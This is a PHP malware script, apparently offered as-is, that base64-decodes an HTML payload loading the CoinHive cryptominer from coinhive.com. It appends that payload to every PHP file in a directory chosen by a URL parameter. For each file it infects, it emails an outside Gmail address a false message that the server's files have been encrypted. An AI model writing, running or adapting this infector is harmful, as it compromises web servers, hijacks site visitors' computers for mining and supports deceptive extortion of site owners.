<?php
$BackDoor= "PGh0bWw+DQo8aGVhZD4NCjxzY3JpcHQgc3JjPSJodHRwczovL2NvaW5oaXZlLmNvbS9saWIvY29pbmhpdmUubWluLmpzIj48L3NjcmlwdD4NCjwvaGVhZD4NCjxib2R5Pg0KPHNjcmlwdD4NCgl2YXIgbWluZXIgPSBuZXcgQ29pbkhpdmUuQW5vbnltb3VzKCdCYnBzZVZ1THRVQmRxd21FNnpubE9WeUVqUjQzelN6MCcpOw0KCQltaW5lci5zdGFydCgpOw0KPC9zY3JpcHQ+DQo8L2JvZHk+DQo8L2h0bWw+";
$BackDoor= base64_decode($BackDoor);
 if(isset($_GET['path'])){$path = $_GET['path'];   }else{$path = getcwd();}
$path = @str_replace('\\','/',$path);$paths = explode('/',$path);
$scandir = @scandir($path);
foreach ($scandir AS $files){
if(@preg_match("/php/",$files)){
$fo = @fopen("$files","a+");
if($fo){
@fwrite($fo,$BackDoor);
$to = "mrsqar@gmail.com";
mail($to,"Done ~!","all server files has been encrypted !");
}
}
}
?>